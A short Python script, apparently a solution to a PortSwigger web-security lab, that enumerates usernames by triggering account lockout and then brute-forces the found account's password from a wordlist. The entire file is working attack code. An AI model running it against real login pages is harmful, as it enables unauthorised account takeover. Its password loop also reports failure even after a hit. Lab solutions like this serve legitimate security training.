# This script was written to complete the lab https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock. 
#   The server locks the account on multiple failed login attempts but is badly implemented


import requests
from bs4 import BeautifulSoup


def enumerate_username(url, session_cookie, usernames):
  headers = {"Cookie": f"session={session_cookie}"}
  for username in usernames:
    for i in range(0, 6):
      params = {"username": username, "password": "abc"}
      response = requests.post(url, headers = headers, data = params)
      soup = BeautifulSoup(response.text, 'html.parser')
      if not "Invalid username or password." in str(soup.find_all('p')):
        print(f"username enumerated: {username}")
        return [True, username]
  print("failed to enumerate an user")
  return [False, None]


def get_password(url, session_cookie, passwords, valid_username):
  headers = {"Cookie": f"session={session_cookie}"}
  for password in passwords:
    params = {"username": valid_username, "password": password}
    response = requests.post(url, headers = headers, data = params)
    soup = BeautifulSoup(response.text, 'html.parser')
    if soup.find('p', attrs={"class" : "is-warning"}) == None:
      print(f"password found: {password}")
  print("failed to brute-force the password")
  return


def main():
  DOMAIN = ""
  URL = f"https://{DOMAIN}/login"
  SESSION_COOKIE = ""

  usernames_file = open("usernames.txt", "r")
  usernames = usernames_file.read().split("\n")
  usernames_file.close()

  passwords_file = open("passwords.txt", "r")
  passwords = passwords_file.read().split("\n")
  passwords_file.close()

  print("finding a valid user...")
  (got_user, valid_username) = enumerate_username(URL, SESSION_COOKIE, usernames)
  if got_user:
    print("testing passwords...")
    get_password(URL, SESSION_COOKIE, passwords, valid_username)


if __name__ == "__main__":
  main()
